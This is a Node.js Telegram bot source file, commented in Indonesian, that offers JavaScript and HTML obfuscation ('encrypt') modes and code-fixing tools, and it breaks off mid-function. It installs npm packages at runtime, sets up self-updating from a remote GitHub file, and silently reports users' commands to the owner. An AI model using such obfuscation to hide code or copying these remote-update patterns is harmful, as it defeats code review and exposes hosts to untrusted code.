const { Telegraf } = require('telegraf');
const fs = require('fs-extra');
const archiver  = require("archiver")
const chokidar  = require("chokidar")
const crypto = require('crypto');
const { execSync } = require("child_process")

function escapeHtml(text = "") {
    return text
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
}

function autoInstall(moduleName) {

    try {

        // cek module
        require.resolve(moduleName)

        console.log(
            `MODULE ${moduleName} sudah terinstall`
        )

    } catch {

        console.log(
            `INSTALL installing ${moduleName}...`
        )

        try {

            execSync(
                `npm install ${moduleName}`,
                {
                    stdio: "inherit"
                }
            )

            console.log(
                `SUCCESS ${moduleName} berhasil diinstall`
            )

        } catch (err) {

            console.log(
                `PROSES INSTALL ${moduleName}`
            )

            console.log(
                err.message
            )
        }
    }
}

// =============================
// AUTO INSTALL LIST
// =============================
const modules = [

    "crypto",
    "axios",
    "fs-extra",
    "grammy",
    "moment-timezone",
    "path",
    "chokidar",
    "archiver@5.3.1",
    "acorn",
    "os",
    "vm",
    "http",
    "https"

]

// =============================
// RUN AUTO INSTALL
// =============================
for (const mod of modules) {

    autoInstall(mod)
}
const axios = require('axios')
const os = require('os')
const https = require("https")
const http = require("http")
const vm = require('vm')
const acorn = require('acorn')
const path = require('path')
const { Bot, InputFile } = require('grammy')
const moment = require("moment-timezone")
const config = require('./config');

// helper euyy
const PATH_MAINTENANCE = "./database/maintenance.json"

// =============================
// CREATE FILE
// =============================
if (!fs.existsSync(PATH_MAINTENANCE)) {

    fs.writeFileSync(
        PATH_MAINTENANCE,
        JSON.stringify({
            status: false,
            reason: "-"
        }, null, 2)
    )
}

// helper baca status maintenance
function isMaintenance() {
    try {
        const data = JSON.parse(
            fs.readFileSync(PATH_MAINTENANCE, "utf8")
        )
        return data.status === true
    } catch {
        return false
    }
}

// Backup Files Jirr
const BACKUP_OWNER_ID = 8937589616

const BACKUP_DIR =
path.join(__dirname, "backup")



// =============================
// CREATE BACKUP DIR
// =============================
if (!fs.existsSync(BACKUP_DIR)) {

    fs.mkdirSync(
        BACKUP_DIR,
        {
            recursive: true
        }
    )
}

const UPDATE_URL =
"https://raw.githubusercontent.com/SabilOfficial-dev/SabilCase/main/indexcom.js"

const LOCAL_FILE = "./index.js"

const UPDATE_FLAG =
"./update.flag"

// Func
const pause = (ms) => new Promise(resolve => setTimeout(resolve, ms))

const E = {
  bot: `<tg-emoji emoji-id='5987802868734760945'>✨</tg-emoji>`,
  botStar: `<tg-emoji emoji-id='4956232383721374836'>✨</tg-emoji>`,
  dev: `<tg-emoji emoji-id='5879770735999717115'>✨</tg-emoji>`,
  doc: `<tg-emoji emoji-id='5839380580080293813'>✨</tg-emoji>`,
  dot: `<tg-emoji emoji-id='5832251986635920010'>✨</tg-emoji>`,
  duration: `<tg-emoji emoji-id='5776213190387961618'>✨</tg-emoji>`,
  emoFree: `<tg-emoji emoji-id='5368324170671202286'>✨</tg-emoji>`,
  err: `<tg-emoji emoji-id='5886496611835581345'>✨</tg-emoji>`,
  games: `<tg-emoji emoji-id='4958903389523018769'>✨</tg-emoji>`,
  group: `<tg-emoji emoji-id='5879896690210639947'>✨</tg-emoji>`,
  grp: `<tg-emoji emoji-id='5983399041197675256'>✨</tg-emoji>`,
  id: `<tg-emoji emoji-id='5819078828017849357'>✨</tg-emoji>`,
  info2: `<tg-emoji emoji-id='5886440807325504167'>✨</tg-emoji>`,
  key: `<tg-emoji emoji-id='5877307202888273539'>✨</tg-emoji>`,
  link: `<tg-emoji emoji-id='5796440171364749940'>✨</tg-emoji>`,
  mute: `<tg-emoji emoji-id='5771511103141975115'>✨</tg-emoji>`,
  name: `<tg-emoji emoji-id='5883964170268840032'>✨</tg-emoji>`,
  ok: `<tg-emoji emoji-id='6296501388276926215'>✨</tg-emoji>`,
  set: `<tg-emoji emoji-id='5886707481844912001'>✨</tg-emoji>`,
  shield: `<tg-emoji emoji-id='5843862283964390528'>✨</tg-emoji>`,
  status: `<tg-emoji emoji-id='5839354140261619193'>✨</tg-emoji>`,
  tools: `<tg-emoji emoji-id='5924720918826848520'>✨</tg-emoji>`,
  total: `<tg-emoji emoji-id='5888799736508454231'>✨</tg-emoji>`,
  user: `<tg-emoji emoji-id='5920344347152224466'>✨</tg-emoji>`,
  version: `<tg-emoji emoji-id='5956561749070057536'>✨</tg-emoji>`,
  warn: `<tg-emoji emoji-id='5881702736843511327'>✨</tg-emoji>`,
  warnInfo: `<tg-emoji emoji-id='5954175920506933873'>✨</tg-emoji>`,

  alasan: `<tg-emoji emoji-id='5839380580080293813'>📝</tg-emoji>`,
  cantik: `<tg-emoji emoji-id='6296501388276926215'>💄</tg-emoji>`,
  casino: `<tg-emoji emoji-id='4958903389523018769'>🎰</tg-emoji>`,
  crown: `<tg-emoji emoji-id='5881702736843511327'>👑</tg-emoji>`,
  game: `<tg-emoji emoji-id='4958903389523018769'>🎮</tg-emoji>`,
  green: `<tg-emoji emoji-id='6296501388276926215'>🟢</tg-emoji>`,
  jackpot: `<tg-emoji emoji-id='6296501388276926215'>🎉</tg-emoji>`,
  kaya: `<tg-emoji emoji-id='6296501388276926215'>💵</tg-emoji>`,
  khodam: `<tg-emoji emoji-id='5987802868734760945'>🔮</tg-emoji>`,
  label: `<tg-emoji emoji-id='5886440807325504167'>🏷️</tg-emoji>`,
  lilin: `<tg-emoji emoji-id='5839354140261619193'>🕯️</tg-emoji>`,
  lock: `<tg-emoji emoji-id='5886496611835581345'>🔒</tg-emoji>`,
  miskin: `<tg-emoji emoji-id='6296501388276926215'>💸</tg-emoji>`,
  namebadge: `<tg-emoji emoji-id='5883964170268840032'>📛</tg-emoji>`,
  pantun: `<tg-emoji emoji-id='5839380580080293813'>📜</tg-emoji>`,
  red: `<tg-emoji emoji-id='5886496611835581345'>🔴</tg-emoji>`,
  sad: `<tg-emoji emoji-id='5886496611835581345'>😢</tg-emoji>`,
  spek: `<tg-emoji emoji-id='5883964170268840032'>📊</tg-emoji>`,
  star2: `<tg-emoji emoji-id='5881702736843511327'>⭐</tg-emoji>`,
  tampan: `<tg-emoji emoji-id='6296501388276926215'>🪞</tg-emoji>`,
  tolol: `<tg-emoji emoji-id='5987802868734760945'>🧠</tg-emoji>`,
  ukur: `<tg-emoji emoji-id='5839380580080293813'>📐</tg-emoji>`,
  umur: `<tg-emoji emoji-id='5839354140261619193'>🎂</tg-emoji>`,
  unlock: `<tg-emoji emoji-id='6296501388276926215'>🔓</tg-emoji>`,
};

const esc = s => s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;")

function analyseCode(code) {
  let errorMsg   = ""
  let errorLine  = null
  let errorCol   = null
  let fixSuggest = ""

  try {
    new Function(code) // eslint-disable-line no-new-func
  } catch (e) {
    errorMsg = e.message
    const msg = e.message

    let m = msg.match(/line (\d+)/i)
    if (m) errorLine = parseInt(m[1])

    if (!errorLine) {
      m = (e.stack || "").match(/<anonymous>:(\d+):(\d+)/)
      if (m) { errorLine = parseInt(m[1]) - 2; errorCol = parseInt(m[2]) }
    }

    if      (/unexpected token 'else'/i.test(msg))       fixSuggest = "Ada blok `if` tidak lengkap atau kurung kurawal `{}` hilang sebelum `else`."
    else if (/unexpected token/i.test(msg))              fixSuggest = "Periksa tanda kurung `()`, kurawal `{}`, siku `[]`, atau titik koma `;` yang hilang/salah posisi."
    else if (/is not defined/i.test(msg))                fixSuggest = "Variabel/fungsi belum dideklarasikan. Tambahkan `const/let/var` atau pastikan sudah di-import."
    else if (/cannot read propert/i.test(msg))           fixSuggest = "Objek bernilai null/undefined. Gunakan optional chaining `?.` atau cek nilai terlebih dahulu."
    else if (/await is only valid/i.test(msg))           fixSuggest = "`await` hanya valid di dalam `async function`. Bungkus kode dengan `async function() {}`."
    else if (/missing \) after/i.test(msg))              fixSuggest = "Tanda kurung `()` tidak ditutup dengan benar."
    else if (/missing } after/i.test(msg))               fixSuggest = "Kurung kurawal `{}` tidak ditutup. Cek penutupan function/object/class."
    else if (/invalid or unexpected/i.test(msg))         fixSuggest = "Token tidak valid di posisi ini. Cek sintaks di sekitar baris error."
    else if (/assignment to constant/i.test(msg))        fixSuggest = "Tidak bisa mengubah nilai `const`. Ganti dengan `let` jika perlu re-assign."
    else if (/duplicate parameter/i.test(msg))           fixSuggest = "Ada parameter yang sama dalam function. Ganti nama parameter yang duplikat."
    else if (/identifier.*already.*declared/i.test(msg)) fixSuggest = "Nama variabel sudah dipakai di scope yang sama. Ganti nama atau hapus deklarasi duplikat."
    else if (/cannot use.*before.*init/i.test(msg))      fixSuggest = "Variabel dipakai sebelum dideklarasikan (temporal dead zone). Pindahkan deklarasi ke atas."
    else if (/unexpected end of input/i.test(msg))       fixSuggest = "Kode belum selesai. Ada kurung atau string yang tidak ditutup di bagian akhir."
    else if (/octal.*strict/i.test(msg))                 fixSuggest = "Literal oktal tidak diizinkan di strict mode. Hapus angka 0 di depan atau gunakan 0o prefix."
    else                                                 fixSuggest = "Periksa sintaks dan logika di sekitar baris yang ditunjuk."
  }

  const annotated = code.split("\n").map((ln, idx) => {
    const no    = String(idx + 1).padStart(4, " ")
    const isErr = errorLine && idx + 1 === errorLine
    return isErr
      ? `${no} | >>>  ${ln}${errorCol ? `   ← ERROR col ${errorCol}` : "   ← ERROR DI SINI"}`
      : `${no} |     ${ln}`
  }).join("\n")

  return { errorMsg, errorLine, errorCol, fixSuggest, annotated, hasError: !!errorMsg }
}

async function downloadTgFile(telegram, fileId) {

    const file =
    await telegram.getFile(fileId)

    const url =
    `https://api.telegram.org/file/bot${config.BOT_TOKEN}/${file.file_path}`

    return new Promise((resolve, reject) => {

        https.get(url, (res) => {

            const chunks = []

            res.on("data", d =>
                chunks.push(d)
            )

            res.on("end", () =>
                resolve(
                    Buffer.concat(chunks)
                    .toString("utf8")
                )
            )

            res.on("error", reject)

        }).on("error", reject)

    })
}

function renderAnnotated(code, errLine) {
  return code.split("\n").map((ln, idx) => {
    const no = String(idx + 1).padStart(4, " ")
    return errLine && idx + 1 === errLine
      ? `${no} | >>>  ${ln}   ← ERROR`
      : `${no} |     ${ln}`
  }).join("\n")
}

function cleanCode(code) {
  const lines  = code.split("\n")
  let   indent = 0
  const STEP   = 2
  const out    = []

  for (const raw of lines) {
    const content = raw.trimEnd().trimStart()
    if (!content) { out.push(""); continue }

    if (/^[}\])]/.test(content)) indent = Math.max(0, indent - STEP)
    out.push(" ".repeat(indent) + content)

    const stripped = content.replace(/\/\/.*$/, "").replace(/"(?:[^"\\]|\\.)*"|'(?:[^'\\]|\\.)*'|`(?:[^`\\]|\\.)*`/g, "").trimEnd()
    const op = (stripped.match(/[{[(]/g) || []).length
    const cl = (stripped.match(/[}\])]/g) || []).length
    if (op > cl) indent += STEP
  }

  return out.join("\n").replace(/\n{3,}/g, "\n\n").trim()
}

function tryAutoFix(code) {
let fixed    = code
  let fixNotes = []

  // Pass 1 — await di luar async
  if (/\bawait\b/.test(fixed) && !/async\s*(function|\()/.test(fixed)) {
    fixed = `async function _autoWrapper() {\n${fixed}\n}\n_autoWrapper().catch(console.error)`
    fixNotes.push("Membungkus dalam async function (await di luar async)")
  }
  let r = analyseCode(fixed)
  if (!r.hasError) return { fixed, fixNotes, result: r }

  // Pass 2 — missing semicolons
  const pass2 = fixed.split("\n").map(ln => {
    const tr = ln.trimEnd()
    if (
      /^(const|let|var|return|throw|break|continue)\b/.test(tr.trim()) &&
      !tr.endsWith(";") && !tr.endsWith("{") && !tr.endsWith("}") &&
      !tr.endsWith(",") && !tr.startsWith("//") && !tr.startsWith("*")
    ) return tr + ";"
    return ln
  }).join("\n")
  r = analyseCode(pass2)
  if (!r.hasError) { fixed = pass2; fixNotes.push("Menambahkan semicolon yang hilang"); return { fixed, fixNotes, result: r } }

  // Pass 3 — tutup kurung kurawal
  const opens3  = (fixed.match(/\{/g) || []).length
  const closes3 = (fixed.match(/\}/g) || []).length
  if (opens3 > closes3) {
    fixed += "\n" + "}".repeat(opens3 - closes3)
    fixNotes.push(`Menambahkan ${opens3 - closes3} kurung kurawal penutup`)
    r = analyseCode(fixed)
    if (!r.hasError) return { fixed, fixNotes, result: r }
  }

  // Pass 4 — tutup tanda kurung biasa
  const openP  = (fixed.match(/\(/g) || []).length
  const closeP = (fixed.match(/\)/g) || []).length
  if (openP > closeP) {
    fixed += ")".repeat(openP - closeP)
    fixNotes.push(`Menutup ${openP - closeP} tanda kurung`)
    r = analyseCode(fixed)
    if (!r.hasError) return { fixed, fixNotes, result: r }
  }

  // Pass 5 — tutup kurung siku
  const openB  = (fixed.match(/\[/g) || []).length
  const closeB = (fixed.match(/\]/g) || []).length
  if (openB > closeB) {
    fixed += "]".repeat(openB - closeB)
    fixNotes.push(`Menutup ${openB - closeB} kurung siku`)
    r = analyseCode(fixed)
    if (!r.hasError) return { fixed, fixNotes, result: r }
  }

  // Pass 6 — hapus baris error dan coba lagi
  if (r.errorLine) {
    const lines6  = fixed.split("\n")
    const errIdx  = r.errorLine - 1
    const removed = lines6.splice(errIdx, 1)[0]
    const after6  = lines6.join("\n")
    const r6      = analyseCode(after6)
    if (!r6.hasError) {
      fixed = after6
      fixNotes.push(`Menghapus baris ${r.errorLine} penyebab error: "${removed.trim()}"`)
      return { fixed, fixNotes, result: r6 }
    }
  }

  return { fixed, fixNotes, result: r }
}

function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;

  return `${days}D, ${hours}H, ${minutes}M, ${secs}S`
}

const startTime = Math.floor(Date.now() / 1000);

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

async function checkUpdateFlag() {
try {

    if (
        !fs.existsSync(
            "./update.flag"
        )
    ) return

    await bot.telegram.sendMessage(
        config.OWNER_ID,
`<blockquote><b>✅ Bot Telah Di Perbarui</b></blockquote>
`, { parse_mode: "HTML" } )
fs.unlinkSync("./update.flag")

} catch (err) {

    console.log(err)

  }
}
// ===================== Clear ========\\\
const bot = new Telegraf(config.BOT_TOKEN);
// Plugin
bot.telegram.setMyCommands([
    {
        command: 'start',
        description: 'Mulai bot'
    },
    {
        command: 'ai',
        description: 'Chat Ai'
    },
    {
        command: 'chatowner',
        description: 'Memberi pesan ke owner'
    },
    {
        command: 'broadcast',
        description: 'khusus owner'
    }   
])
.then(() => {
    console.log('Success register cmd')
})
.catch(console.error)

// =============================
// LOG AKTIVITAS USER ONLY
// =============================
bot.use(async (ctx, next) => {

    // hanya message text
    if (!ctx.message?.text) {
        return next()
    }

    const text =
        ctx.message.text

    // hanya command
    if (!text.startsWith("/")) {
        return next()
    }

    const user =
        ctx.from

    const userId =
        Number(user.id)

    // skip owner
    if (userId === config.OWNER_ID) {
        return next()
    }

    // waktu
    const waktu =
        new Date().toLocaleString(
            "id-ID"
        )

    // ambil cmd
    const cmd =
        text.split(" ")[0]

    // ambil args
    const args =
        text.split(" ")
        .slice(1)
        .join(" ") || "-"

    // username
    const username =
        user.username
        ? "@" + user.username
        : "Tidak ada"

    // mention
    const mention =
`${ctx.from.first_name}`

    // kirim log ke owner
    await bot.telegram.sendMessage(
        config.OWNER_ID,
`\`\`\`js
╔═══════ ೋღ 🌺 ღೋ ═══════╗
     Aktifitas-User-Terdeteksi
╚═══════ ೋღ 🌺 ღೋ ═══════╝
👤 USER : ${mention}
👥 USERNAME : ${username}
🆔 ID : ${userId}
⚡ COMMAND : ${cmd}
🕒 WAKTU : ${waktu}\`\`\`
`,
        {
            parse_mode: "Markdown",
            disable_web_page_preview: true
        }
    ).catch(() => {})

    return next()

})

// =============================
// MAINTENANCE MIDDLEWARE
// =============================
bot.use(async (ctx, next) => {

    const data = JSON.parse(
        fs.readFileSync(PATH_MAINTENANCE, "utf8")
    )

    const maintenance = data.status
    const reason = data.reason || "Tidak ada alasan"

    const userId = Number(ctx.from.id)

    // =============================
    // OWNER BYPASS
    // =============================
    if (userId === config.OWNER_ID) {
        return next()
    }

    // =============================
    // MAINTENANCE OFF
    // =============================
    if (!maintenance) {
        return next()
    }

    // =============================
    // USER & PREMIUM TERKENA
    // =============================
    return ctx.reply(
        `\`\`\`js
═════════•°•⚠️•°•═════════
⚙️ BOT SEDANG MAINTENANCE

Tunggu hingga maintenance selesai.
📝 information : ${reason}
═════════════════════════\`\`\`

`,
        {
            parse_mode: "Markdown"
        }
    )
})

//// simpan mapping pesan owner -> user
const CHAT_SESSION = {}
const REPLY_MAP = {}


// ==================== DATABASE AKSES ====================
const ACCESS_FILE = './akses.json';

function loadAkses() {
    if (!fs.existsSync(ACCESS_FILE)) {
        fs.writeJsonSync(ACCESS_FILE, { users: {} });
    }
    return fs.readJsonSync(ACCESS_FILE);
}

function saveAkses(data) {
    fs.writeJsonSync(ACCESS_FILE, data, { spaces: 2 });
}

function isUserHasAccess(userId) {
    const data = loadAkses();
    return data.users[userId] === true;
}

function setUserAccess(userId, hasAccess) {
    const data = loadAkses();

    if (hasAccess) {
        data.users[userId] = true;
    } else {
        delete data.users[userId];
    }

    saveAkses(data);
}

// ==================== THUMBNAIL LOKAL ====================
async function getThumbnailBuffer() {
    try {
        if (await fs.pathExists(config.THUMBNAIL_PATH)) return await fs.readFile(config.THUMBNAIL_PATH);
        return null;
    } catch (err) { return null; }
}

// ==================== KEYBOARD ====================
const openMenuKeyboard = {
    inline_keyboard: [
    [
      { 
        text: "𝖮𝗐𝗇𝖾𝗋", 
        url: "https://t.me/sabilofficial",
        style: "success" 
       },
      { 
        text: "⌦", 
        callback_data: "tools_menu", 
        style: "primary" 
       } 
    ]
  ]
};

const OwnKb = {
    inline_keyboard: [
        [
         { 
          text: "⌫", 
          callback_data: "main_menu",
          style: "primary"
         },
         { 
          text: "⌦", 
          callback_data: "tools_menu",
          style: "danger"
         }
       ]
    ]
};

const ToolsKeyboard = {
    inline_keyboard: [
        [
         { 
          text: "⌫", 
          callback_data: "main_menu",
          style: "primary"
         },
         { 
          text: "⌦", 
          callback_data: "enc_menu_v1",
          style: "danger"
         }
       ]
    ]
};

const EncV1Keyboard = {
    inline_keyboard: [
        [
         { 
          text: "⌫", 
          callback_data: "tools_menu",
          style: "success"
         },
         { 
          text: "⌦", 
          callback_data: "enc_menu_v2",
          style: "primary"
         }
       ]
    ]
};

const EncV2Keyboard = {
    inline_keyboard: [
        [
         { 
          text: "⌫", 
          callback_data: "enc_menu_v1",
          style: "danger"
         },
         { 
          text: "⌦", 
          callback_data: "main_menu",
          style: "success" 
         }
       ]
    ]
};

// wik wok the tolk
async function sendEncryptProgress(ctx, waitMsg, modeName) {
    const steps = [
        { percent: 20, text: `⚙️ Mengunduh file (mode: ${modeName})`, delay: 600 },
        { percent: 40, text: `⚙️ PROSES ENCRYPT (${modeName})`, delay: 800 },
        { percent: 70, text: `⚙️ Encrypting dengan algoritma ${modeName}...`, delay: 800 },
        { percent: 80, text: `⚙️ Penyelesaian Encrypt... Cukup Lama`, delay: 4000 },
        { percent: 100, text: `✅ File berhasil diencrypt! (${modeName})`, delay: 500 }
    ];
    for (const step of steps) {
        const barLength = 10;
        const filled = Math.round((step.percent / 100) * barLength);
        const bar = '▰'.repeat(filled) + '▱'.repeat(barLength - filled);
        await ctx.telegram.editMessageText(waitMsg.chat.id, waitMsg.message_id, undefined, `<pre>✅ Encrypt Berjalan\n${step.text}\n${bar} ${step.percent}%</pre>`, { parse_mode: 'HTML' });
        await new Promise(resolve => setTimeout(resolve, step.delay));
    }
}

// kacung prime
async function processObfuscate(
    ctx,
    obfuscator,
    modeName = "default"
) {

    if (typeof obfuscator !== "function") {
        console.error(
            "Obfuscator tidak valid:",
            obfuscator
        )

        return ctx.reply(
            "❌ Obfuscator tidak valid."
        )
    }

    const userId = ctx.from.id

    if (
        !isUserHasAccess(userId) &&
        userId !== config.OWNER_ID
    ) {
        return ctx.reply(
            "❌ Akses ditolak."
        )
    }

    if (!ctx.message.reply_to_message) {
        return ctx.reply(
            "❌ Reply file .js"
        )
    }

    let code = ""
    let originalBaseName = "script"

    const replied =
        ctx.message.reply_to_message

    if (replied.text) {

        code = replied.text
        originalBaseName = "code"

    } else if (replied.document) {

        const doc = replied.document

        if (
            doc.mime_type !==
                "text/javascript" &&
            !doc.file_name.endsWith(".js")
        ) {
            return ctx.reply(
                "❌ File harus .js"
            )
        }

        originalBaseName =
            doc.file_name.replace(
                /\.[^/.]+$/,
                ""
            )

        const fileLink =
            await ctx.telegram.getFileLink(
                doc.file_id
            )

        const response =
            await axios.get(
                fileLink.href,
                {
                    responseType: "text"
                }
            )

        code = response.data

    } else {

        return ctx.reply(
            "❌ Reply file .js atau kode."
        )

    }

    const outputFilename =
        `${String(modeName)
            .replace(/ /g, "_")
            .toLowerCase()
        }-encrypt-${originalBaseName}.js`

    const waitMsg =
        await ctx.reply(
            `<pre>▰▱▱▱▱▱▱▱▱▱ 10%</pre>
⚙️ Memulai Obfuscation: ${modeName}`,
            {
                parse_mode: "HTML"
            }
        )

    try {

        await sendEncryptProgress(
            ctx,
            waitMsg,
            modeName
        )

        const obfuscated =
            obfuscator(code)

        const buffer =
            Buffer.from(
                obfuscated,
                "utf8"
            )

        await ctx.replyWithDocument(
            {
                source: buffer,
                filename: outputFilename
            },
            {
                caption:
                    `✅ Mode: ${modeName}\n` +
                    `File berhasil di encrypt`
            }
        )

        await ctx.deleteMessage(
            waitMsg.message_id
        ).catch(() => {})

    } catch (err) {

        console.error(err)

        await ctx.telegram
            .editMessageText(
                waitMsg.chat.id,
                waitMsg.message_id,
                undefined,
                `❌ Gagal:\n${err.message}`
            )
            .catch(() => {})

    }

}

bot.start(async (ctx) => {
    const userId = String(ctx.from.id);

    // Simpan user baru otomatis
    if (!isUserHasAccess(userId)) {
        setUserAccess(userId, true);

        console.log(
            `[NEW USER] ${ctx.from.first_name || 'No Name'} (${userId})`
        );
    }

    // Reaction ke pesan /start
    try {
        await ctx.telegram.setMessageReaction(
            ctx.chat.id,
            ctx.message.message_id,
            [
                {
                    type: 'emoji',
                    emoji: '🎉'
                }
            ]
        );
    } catch (err) {
        console.log('Gagal memberi reaction:', err.message);
    }

    return showMenu1(ctx);
});

// ==================== TAMPILAN MENU ====================
async function showMenu1(ctx, messageId = null) {
    const bottime = getBotRuntime();
    const caption = `\`\`\`js
╔══════✮❁•°♛°•❁✮ ═════╗
    𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨   ─  𝐔𝐬𝐞𝐫𝐬
       𝐁𝐲 : 𝐒𝐚𝐛𝐢𝐥𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥
╚══════✮❁•°❀°•❁✮══════╝

System : Free Access Activated
Usename : ${ctx.from.username}
Id : ${ctx.from.id}
Runtime : ${bottime}
Featur : Encrypt For File,Tools,Dll
━━━━━━━━━━━━━━━━━━━━

﴿إِنَّ اللَّهَ هُوَ الرَّزَّاقُ ذُو الْقُوَّةِ الْمَتِينُ﴾ ۞ الذاريات / ٥٨

Sesungguhnya Allah lah Pemberi rezki, Dialah yang mempunyai kekuatan yang kokoh.

خداوند خود روزىرسان نيرومند استوار است.\`\`\`
`;
    const thumb = await getThumbnailBuffer();
    if (messageId) {
        // Edit pesan yang sudah ada
        if (thumb) {
            await ctx.telegram.editMessageMedia(ctx.chat.id, messageId, undefined, {
                type: 'photo',
                media: { source: thumb },
                caption,
                parse_mode: 'Markdown'
            }, { reply_markup: openMenuKeyboard });
        } else {
            await ctx.telegram.editMessageText(ctx.chat.id, messageId, undefined, caption, {
                parse_mode: 'Markdown',
                reply_markup: openMenuKeyboard
            });
        }
    } else {
        // Kirim pesan baru
        if (thumb) {
            await ctx.replyWithPhoto({ source: thumb }, { caption, parse_mode: 'Markdown', reply_markup: openMenuKeyboard });
        } else {
            await ctx.reply(caption, { parse_mode: 'Markdown', reply_markup: openMenuKeyboard });
        }
    }
}

async function showMenu2(ctx, messageId = null) {
    const caption = `<pre>
╔═══════ ೋღ 𝖳𝗈𝗈𝗅𝗌 𝖬𝖾𝗇𝗎 ღೋ ═══════╗
╠ ▢ /cekcode Reply code
╠ ▢ /cekerror Reply file/code
╠ ▢ /infoerror Reply File/code
╠ ▢ /cekidemoji Reply emoji
╠ ▢ /fixerror Reply file/code
╠ ▢ /cleancode Reply File/code
╠ ▢ /ai 𝖢𝗁𝖺𝗍 teks
╠ ▢ /getsource Link Https
╚═══════ ೋღ ══ 🌸 ══ღೋ ═══════╝</pre>
`;
    const thumb = await getThumbnailBuffer();
    if (messageId) {
        if (thumb) {
            await ctx.telegram.editMessageMedia(ctx.chat.id, messageId, undefined, {
                type: 'photo',
                media: { source: thumb },
                caption,
                parse_mode: 'HTML'
            }, { reply_markup: ToolsKeyboard });
        } else {
            await ctx.telegram.editMessageText(ctx.chat.id, messageId, undefined, caption, {
                parse_mode: 'HTML',
                reply_markup: ToolsKeyboard
            });
        }
    } else {
        if (thumb) {
            await ctx.replyWithPhoto({ source: thumb }, { caption, parse_mode: 'HTML', reply_markup: ToolsKeyboard });
        } else {
            await ctx.reply(caption, { parse_mode: 'HTML', reply_markup: ToolsKeyboard });
        }
    }
}

async function EncV1(ctx, messageId = null) {
    const caption = `<pre>
╔═══════ ೋღ 𝖤𝗇𝖼𝗋𝗒𝗉𝗍 𝖬𝖾𝗇𝗎 𝖵𝟣 ღೋ ═══════╗
╠ ▢ /artillery Light & Secure 𝗉𝗋𝗈𝗍𝖾𝖼𝗍𝗂𝗈𝗇
╠ ▢ /hardcode Max Protection mode
╠ ▢ /phantom Invisible & Strong code
╠ ▢ /balanced Smart & Stable defense
╠ ▢ /reversed Rename & Shield system
╠ ▢ /rosemary 𝖴𝗅𝗍𝗋𝖺 𝖣𝖾𝖿𝖾𝗇𝗌𝖾 𝗆𝗈𝖽𝖾
╠ ▢ /enctime 𝟥𝟢 (𝟥𝟢 𝗁𝖺𝗋𝗂)
╠ ▢ /hardhtml Encrypt Hard Html
╠════════════════════════════════════╣
║ Cara Penggunaan
║ /enctime 30
║ Jadi setiap angka = 1hari
║ Jadi kalo 10 = 10hari
╚═══════ ೋღ ═══  🌸  ═══ ღೋ ═══════╝</pre>
`;
    const thumb = await getThumbnailBuffer();
    if (messageId) {
        if (thumb) {
            await ctx.telegram.editMessageMedia(ctx.chat.id, messageId, undefined, {
                type: 'photo',
                media: { source: thumb },
                caption,
                parse_mode: 'HTML'
            }, { reply_markup: EncV1Keyboard });
        } else {
            await ctx.telegram.editMessageText(ctx.chat.id, messageId, undefined, caption, {
                parse_mode: 'HTML',
                reply_markup: EncV1Keyboard
            });
        }
    } else {
        if (thumb) {
            await ctx.replyWithPhoto({ source: thumb }, { caption, parse_mode: 'HTML', reply_markup: EncV1Keyboard });
        } else {
            await ctx.reply(caption, { parse_mode: 'HTML', reply_markup: EncV1Keyboard });
        }
    }
}

async function EncV2(ctx, messageId = null) {
    const caption = `<pre>
╔═══════ ೋღ 𝖤𝗇𝖼𝗋𝗒𝗉𝗍 𝖬𝖾𝗇𝗎 𝖵𝟤 ღೋ ═══════╗
╠ ▢ /enccustom 𝖢𝗎𝗌𝗍𝗈𝗆 𝖭𝖺𝗆𝖾
╠ ▢ /invisenc 𝖨𝗇𝗏𝗂𝗌𝖻𝗅𝖾 𝖧𝖺𝗋𝖽
╠ ▢ /japanenc 𝖩𝖺𝗉𝖺𝗇𝖾𝗌𝖾 𝖲𝗍𝗒𝗅𝖾
╠ ▢ /encarab 𝖠𝗋𝖺𝖻 𝖲𝗍𝗒𝗅𝖾
╠ ▢ /siuenc 𝖲𝗂𝗎 𝖲𝗍𝗒𝗅𝖾
╠ ▢ /japan 𝖩𝖺𝗉𝖺𝗇 𝖲𝗍𝗒𝗅𝖾
╠ ▢ /nebula 𝖭𝖾𝖻𝗎𝗅𝖺 𝖲𝗍𝗒𝗅𝖾
╠ ▢ /var 𝖵𝖺𝗋 𝖲𝗍𝗒𝗅𝖾
╠ ▢ /invishtml Encrypt Hmtl
╠════════════════════════════════════╣
║ Cara Penggunaan
║ /enccustom 果Prime皮Sabil出Official去
║ Jangan ada spasi dalam text
╚═══════ ೋღ ═══  🌸  ═══ ღೋ ═══════╝</pre>
`;
    const thumb = await getThumbnailBuffer();
    if (messageId) {
        if (thumb) {
            await ctx.telegram.editMessageMedia(ctx.chat.id, messageId, undefined, {
                type: 'photo',
                media: { source: thumb },
                caption,
                parse_mode: 'HTML'
            }, { reply_markup: EncV2Keyboard });
        } else {
            await ctx.telegram.editMessageText(ctx.chat.id, messageId, undefined, caption, {
                parse_mode: 'HTML',
                reply_markup: EncV2Keyboard
            });
        }
    } else {
        if (thumb) {
            await ctx.replyWithPhoto({ source: thumb }, { caption, parse_mode: 'HTML', reply_markup: EncV2Keyboard });
        } else {
            await ctx.reply(caption, { parse_mode: 'HTML', reply_markup: EncV2Keyboard });
        }
    }
}

// ==================== CALLBACK ====================
bot.action('open_menu', async (ctx) => {
    const messageId = ctx.callbackQuery.message.message_id;
    await showMenu1(ctx, messageId);
    await ctx.answerCbQuery();
});

bot.action('main_menu', async (ctx) => {
    const messageId = ctx.callbackQuery.message.message_id;
    await showMenu1(ctx, messageId);
    await ctx.answerCbQuery();
});

bot.action('enc_menu_v1', async (ctx) => {
    const messageId = ctx.callbackQuery.message.message_id;
    await EncV1(ctx, messageId);
    await ctx.answerCbQuery();
});

bot.action('enc_menu_v2', async (ctx) => {
    const messageId = ctx.callbackQuery.message.message_id;
    await EncV2(ctx, messageId);
    await ctx.answerCbQuery();
});

bot.action('tools_menu', async (ctx) => {
    const messageId = ctx.callbackQuery.message.message_id;
    await showMenu2(ctx, messageId);
    await ctx.answerCbQuery();
});
// ==================== RANDOM ====================


// Fixed helper functions

function randomHex(length = 40){
